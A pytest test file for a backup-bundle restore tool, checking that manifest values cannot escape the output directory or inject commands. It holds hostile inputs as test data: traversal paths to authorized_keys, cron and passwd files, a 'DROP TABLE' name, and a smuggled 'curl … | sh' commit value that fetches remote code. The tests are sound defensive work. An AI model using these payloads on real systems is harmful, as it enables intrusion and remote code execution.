"""A bundle's own bytes do not get to name a path on this machine.

`safe_extract` decided that for archive members. `restore_to` is the one
place the decision was not applied: it is read from the manifest and joined
straight onto `--out`, AFTER extraction, so `safe_extract` never sees it. A
bundle whose manifest said `restore_to: "volume:../../../ESCAPEDtree/x"`
placed real content two levels above `--out` and exited 0 printing
"verified".

The manifest lives inside `payload.enc`, so writing one takes the
passphrase — which is exactly the case §7.6 and §9.2 contemplate: a bundle
someone hands you, along with its passphrase, on a machine that has nothing.
Both implementations refuse it independently, because the reader opens files
it did not write.
"""

import copy
import json
import os
import subprocess
import sys
import tarfile

import pytest
from bundle_fixtures import BACKUP_DIR, PASSPHRASE, forge_bundle, make_stage, plan, run

import novabundle as nb

ESCAPES = [
    "../../../ESCAPED/authorized_keys",
    "..",
    "a/../../b",
    "/etc/cron.d/nova",
    "~/.ssh/authorized_keys",
    "C:/windows/system32/x",
    "a//b",
    "a/./b",
]


@pytest.fixture
def manifest(tmp_path):
    return plan(make_stage(tmp_path))


# ── the writer refuses to record one ────────────────────────────────────────


@pytest.mark.parametrize("value", ESCAPES)
def test_a_traversing_file_restore_to_is_refused(manifest, value):
    broken = copy.deepcopy(manifest)
    for row in broken["members"]:
        if row["kind"] == "file":
            row["restore_to"] = value
    with pytest.raises(nb.ManifestError) as caught:
        nb.load_manifest(broken)
    assert "restore_to" in str(caught.value)


@pytest.mark.parametrize("value", ESCAPES)
def test_a_traversing_volume_restore_to_is_refused(manifest, value):
    broken = copy.deepcopy(manifest)
    for row in broken["members"]:
        if row["kind"] == "tree":
            row["restore_to"] = f"volume:{value}"
    with pytest.raises(nb.ManifestError) as caught:
        nb.load_manifest(broken)
    assert "docker volume" in str(caught.value)


@pytest.mark.parametrize(
    "field,where",
    [
        ("path", "members"),
        ("prefix", "volumes"),
        ("listing_member", "volumes"),
        ("member", "files"),
        ("origin", "files"),
        ("dump_member", "databases"),
        ("counts_member", "databases"),
        ("migrations_member", "databases"),
    ],
)
def test_every_path_in_the_manifest_is_treated_as_hostile(manifest, field, where):
    broken = copy.deepcopy(manifest)
    broken[where][0][field] = "../../../ESCAPED/x"
    with pytest.raises(nb.ManifestError) as caught:
        nb.load_manifest(broken)
    assert "ESCAPED" in str(caught.value)


@pytest.mark.parametrize("value", ["../evil", "nova/../../x", "/abs", ""])
def test_a_volume_full_name_that_is_not_a_volume_name_is_refused(manifest, value):
    broken = copy.deepcopy(manifest)
    broken["volumes"][0]["full_name"] = value
    with pytest.raises(nb.ManifestError):
        nb.load_manifest(broken)


@pytest.mark.parametrize("value", ["../evil", "nova core", "a;DROP TABLE x"])
def test_a_database_name_that_is_not_a_name_is_refused(manifest, value):
    broken = copy.deepcopy(manifest)
    broken["databases"][0]["name"] = value
    with pytest.raises(nb.ManifestError):
        nb.load_manifest(broken)


@pytest.mark.parametrize("value", ["A=B", "../x", "a b", ""])
def test_env_keys_hold_variable_names_and_nothing_else(manifest, value):
    broken = copy.deepcopy(manifest)
    broken["env_keys"] = [value]
    with pytest.raises(nb.ManifestError):
        nb.load_manifest(broken)


def test_pack_refuses_a_manifest_with_a_traversing_restore_to(tmp_path):
    stage = make_stage(tmp_path)
    manifest = plan(stage)
    for row in manifest["members"]:
        if row["kind"] == "file":
            row["restore_to"] = "../../../ESCAPED/authorized_keys"
    (stage / "MANIFEST.json").write_text(json.dumps(manifest, indent=2) + "\n")
    out = tmp_path / "b.tar.part"
    assert run(["pack", "--stage", str(stage), "--out", str(out)]) == 1
    assert not out.exists()


# ── the reader refuses one it is handed ─────────────────────────────────────


def _escape(manifest):
    for row in manifest["members"]:
        if row["kind"] == "tree":
            row["restore_to"] = "volume:../../../ESCAPEDtree/x"
        if row["kind"] == "file":
            row["restore_to"] = "../../../ESCAPEDfile/authorized_keys"


def test_verify_refuses_a_forged_manifest(tmp_path):
    bundle, _, _ = forge_bundle(tmp_path, _escape)
    assert run(["verify", "--bundle", str(bundle)]) == 1


@pytest.mark.parametrize("force", ["0", "1"])
def test_the_reader_writes_nothing_outside_out_and_does_not_say_verified(tmp_path, force):
    """The reviewer's exact bundle. Before: `verified: 7 members match their
    checksums`, exit 0, and real content two levels above `--out`."""
    deep = tmp_path / "a" / "b"
    deep.mkdir(parents=True)
    bundle, _, _ = forge_bundle(deep, _escape)
    out = deep / "out"
    env = dict(os.environ, NOVA_FORCE_CTYPES_GCM=force)
    done = subprocess.run(
        [sys.executable, str(BACKUP_DIR / "nova_restore.py"), str(bundle), "--out", str(out)],
        input=PASSPHRASE + "\n",
        text=True,
        capture_output=True,
        env=env,
    )
    assert done.returncode == 1, done.stdout + done.stderr
    assert "does not trust" in done.stderr
    assert not (tmp_path / "ESCAPEDfile").exists()
    assert not (tmp_path / "ESCAPEDtree").exists()
    assert not (tmp_path / "a" / "ESCAPEDfile").exists()
    assert not (tmp_path / "a" / "ESCAPEDtree").exists()
    assert not out.exists() or not list(out.iterdir())
    assert "Next, on this machine" not in done.stdout


def test_the_reader_refuses_an_absolute_restore_to(tmp_path):
    def absolute(manifest):
        for row in manifest["members"]:
            if row["kind"] == "file":
                row["restore_to"] = "/tmp/nova-should-never-be-written"

    bundle, _, _ = forge_bundle(tmp_path, absolute)
    done = subprocess.run(
        [
            sys.executable,
            str(BACKUP_DIR / "nova_restore.py"),
            str(bundle),
            "--out",
            str(tmp_path / "out"),
        ],
        input=PASSPHRASE + "\n",
        text=True,
        capture_output=True,
    )
    assert done.returncode == 1
    assert not os.path.exists("/tmp/nova-should-never-be-written")


def test_a_forged_bundle_still_opens_when_its_paths_are_honest(tmp_path):
    """The refusals above must not be a blanket refusal of anything this
    tool did not write: a hand-built bundle with honest paths opens."""
    bundle, _, _ = forge_bundle(tmp_path, lambda manifest: None)
    assert run(["verify", "--bundle", str(bundle)]) == 0
    with tarfile.open(bundle, "r:") as tar:
        assert tar.getnames() == list(nb.OUTER_ORDER)


def _reader_module():
    import importlib.util

    spec = importlib.util.spec_from_file_location(
        "nova_restore_hostile", BACKUP_DIR / "nova_restore.py"
    )
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.mark.parametrize(
    "path", ["../../../outside.txt", "/etc/hostname", "a/../../outside.txt", "~/x"]
)
def test_a_traversing_member_path_is_never_read_from_outside_the_archive(tmp_path, path):
    """The READ side of the same hole, and it is a separate one.
    `verify_extracted` joined `members[].path` straight onto the extraction
    root, so a manifest naming `../../../etc/hostname` with that file's real
    sha256 would have reported "verified" over a file that was never in the
    bundle. Driven at the function, because `pack` cannot build such an
    archive — only something else handing this reader a bundle can.
    """
    reader = _reader_module()
    root = tmp_path / "inner"
    root.mkdir()
    manifest = {
        "members": [
            {
                "path": path,
                "origin": "x",
                "kind": "file",
                "bytes": 1,
                "sha256": "0" * 64,
                "restore_to": "deploy/.env",
            }
        ],
        "volumes": [],
    }
    with pytest.raises(reader.RestoreError) as caught:
        reader.verify_extracted(str(root), manifest, {})
    assert "does not trust" in str(caught.value)


def test_a_traversing_listing_member_is_never_read(tmp_path):
    reader = _reader_module()
    root = tmp_path / "inner"
    (root / "volumes" / "v4_memdata").mkdir(parents=True)
    manifest = {
        "members": [
            {
                "path": "volumes/v4_memdata/",
                "origin": "x",
                "kind": "tree",
                "bytes": 0,
                "sha256": "0" * 64,
                "restore_to": "volume:nova_v4_memdata",
            }
        ],
        "volumes": [{"prefix": "volumes/v4_memdata/", "listing_member": "../../../outside.sha256"}],
    }
    with pytest.raises(reader.RestoreError) as caught:
        reader.verify_extracted(str(root), manifest, {})
    assert "does not trust" in str(caught.value)


# ── the two verifiers must not disagree about the same file ────────────────


@pytest.mark.parametrize("force", ["0", "1"])
def test_verify_only_refuses_what_novabundle_verify_refuses(tmp_path, force):
    """`--verify-only` used to exit 0 with "all matching the manifest sealed
    inside" on a bundle `novabundle verify` exited 1 on, because it never
    looked at `restore_to`. An operator with two verifiers will believe
    whichever one agrees with him."""
    bundle, _, _ = forge_bundle(tmp_path, _escape)
    assert run(["verify", "--bundle", str(bundle)]) == 1
    done = subprocess.run(
        [sys.executable, str(BACKUP_DIR / "nova_restore.py"), str(bundle), "--verify-only"],
        input=PASSPHRASE + "\n",
        text=True,
        capture_output=True,
        env=dict(os.environ, NOVA_FORCE_CTYPES_GCM=force),
    )
    assert done.returncode == 1, done.stdout
    assert "verified" not in done.stdout
    assert "does not trust" in done.stderr


def test_the_word_verified_is_not_printed_before_the_paths_are_checked(tmp_path):
    """It was: `verified: 7 members match their checksums` went to stdout and
    the refusal came after it. The check moved in front of the print."""
    deep = tmp_path / "a" / "b"
    deep.mkdir(parents=True)
    bundle, _, _ = forge_bundle(deep, _escape)
    done = subprocess.run(
        [
            sys.executable,
            str(BACKUP_DIR / "nova_restore.py"),
            str(bundle),
            "--out",
            str(deep / "out"),
        ],
        input=PASSPHRASE + "\n",
        text=True,
        capture_output=True,
    )
    assert done.returncode == 1
    assert "verified" not in done.stdout, done.stdout


# ── a member that is a symlink changes meaning when it is placed ───────────


def test_a_symlink_file_member_is_never_placed(tmp_path):
    """Containment was checked against the member's depth INSIDE the archive.
    Placement moves it to a different depth, and a relative target is
    resolved from where the link sits — so a link that was contained can
    point outside once placed. Nothing is written; this is a pointer.
    """

    def link_the_env(stage):
        env = stage / "inner" / "files" / "deploy" / ".env"
        env.unlink()
        env.symlink_to("../../volumes/v4_memdata/people/example/a-note.md")

    bundle, _, _ = forge_bundle(tmp_path, lambda m: None, mutate_stage=link_the_env)
    out = tmp_path / "out"
    done = subprocess.run(
        [sys.executable, str(BACKUP_DIR / "nova_restore.py"), str(bundle), "--out", str(out)],
        input=PASSPHRASE + "\n",
        text=True,
        capture_output=True,
    )
    assert done.returncode == 1, done.stdout
    assert "is a symlink" in done.stderr
    assert not out.exists() or not list(out.iterdir())


# ── the two placement guards, pinned one at a time ─────────────────────────


def test_volume_name_refuses_on_its_own(tmp_path):
    reader = _reader_module()
    for value in ("volume:../../../x", "volume:/abs", "volume:", "volume:a/b", "db:x"):
        with pytest.raises(reader.RestoreError):
            reader._volume_name(value)
    assert reader._volume_name("volume:nova_v4_memdata") == "nova_v4_memdata"


def test_must_stay_inside_refuses_on_its_own(tmp_path):
    """The belt. With the two braces in place nothing in the product reaches
    it — which is exactly why it needs its own pin: removing it alone was
    caught by nothing."""
    reader = _reader_module()
    out = tmp_path / "out"
    (out / "project").mkdir(parents=True)
    reader._must_stay_inside(str(out), str(out / "project" / "x"))
    for escape in ("..", "../x", "/etc/passwd"):
        with pytest.raises(reader.RestoreError) as caught:
            reader._must_stay_inside(str(out), str(out / escape))
        assert "outside" in str(caught.value)


def test_relative_refuses_on_its_own():
    reader = _reader_module()
    for value in ESCAPES + ["", None, "a\\b"]:
        with pytest.raises(reader.RestoreError):
            reader._relative(value)
    assert reader._relative("deploy/.env") == "deploy/.env"


# ── a value inside the bundle does not compose the command it prints ───────
#
# The fourth instance of the class s41/rulings.md amended on 2026-09-21 (the
# first three: restore.sh's decryptor image, §9.3 step 2's postgres image and
# its decryptor). This one is prose rather than a `docker run`: the reader
# closes with two numbered steps the operator is meant to carry out, and step
# 1 is `check out <source.repo_sha>` — a value that came out of the file
# being opened, printed into a line somebody pastes into a shell.


def _hostile_commit(manifest):
    manifest["source"]["repo_sha"] = "main; curl -s http://nova.example/x | sh #"


def test_the_commit_it_tells_you_to_check_out_is_shape_checked(tmp_path):
    bundle, _, _ = forge_bundle(tmp_path, _hostile_commit, name="commit.tar")
    out = tmp_path / "out"
    done = subprocess.run(
        [sys.executable, str(BACKUP_DIR / "nova_restore.py"), str(bundle), "--out", str(out)],
        input=PASSPHRASE + "\n",
        text=True,
        capture_output=True,
        env=dict(os.environ, NOVA_FORCE_CTYPES_GCM="0"),
    )
    assert done.returncode == 0, done.stderr
    assert "curl" not in done.stdout, "the bundle wrote part of a command line"
    assert "the recorded commit" in done.stdout, "and the reader says it has none it trusts"


def test_an_honest_commit_is_still_printed(tmp_path):
    """The other half: a shape check that refused every real bundle would be
    the third defect in the report, not a fix."""
    bundle, manifest, _ = forge_bundle(tmp_path, lambda m: None, name="honest-commit.tar")
    out = tmp_path / "honest"
    done = subprocess.run(
        [sys.executable, str(BACKUP_DIR / "nova_restore.py"), str(bundle), "--out", str(out)],
        input=PASSPHRASE + "\n",
        text=True,
        capture_output=True,
        env=dict(os.environ, NOVA_FORCE_CTYPES_GCM="0"),
    )
    assert done.returncode == 0, done.stderr
    assert manifest["source"]["repo_sha"] in done.stdout
